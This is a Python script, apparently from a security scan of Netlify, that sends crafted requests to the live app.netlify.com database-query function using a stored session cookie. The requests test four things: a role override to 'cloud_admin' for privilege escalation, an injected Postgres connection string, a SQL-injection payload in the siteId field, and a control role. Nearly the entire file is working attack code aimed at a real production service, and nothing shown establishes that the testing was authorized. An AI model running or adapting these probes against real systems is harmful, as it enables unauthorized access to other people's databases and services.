# -*- coding: utf-8 -*-
"""Netlify database-query wrapper 参数面:role 覆盖 / 连接串注入 / siteId 错误族(假设检验,非枚举)
Y1 role=cloud_admin(内部 API 若有该 role 连接串 -> 直通提权)
Y2 connection_string 直接提供(后端信任则任意连接)
Y3 siteId 畸形(判断 siteId 是否进入 SQL 拼接)
Y4 role=netlifydb_owner 对照
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()


def req(body, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw


def run(tag, body, cut=700):
    try:
        s, raw = req(body)
        txt = raw.decode('utf-8', 'ignore').replace('\n', ' ')
        print('%-28s [%d] %s' % (tag, s, txt[:cut]))
    except Exception as e:
        print('%-28s ERR %s' % (tag, str(e)[:100]))


base = {'siteId': SITE_ID, 'action': 'query', 'sql': 'select current_user'}
run('Y1_role_cloud_admin', dict(base, role='cloud_admin'))
run('Y2_connstr_inject', dict(base, connection_string='postgresql://cloud_admin:x@127.0.0.1:5432/postgres'))
run('Y3_siteid_bad', {'siteId': "04f08ff6-f274-47ac-b6d7-5fb1e055f3b4' or '1'='1", 'action': 'query', 'sql': 'select 1'})
run('Y4_role_owner_ctl', dict(base, role='netlifydb_owner'))
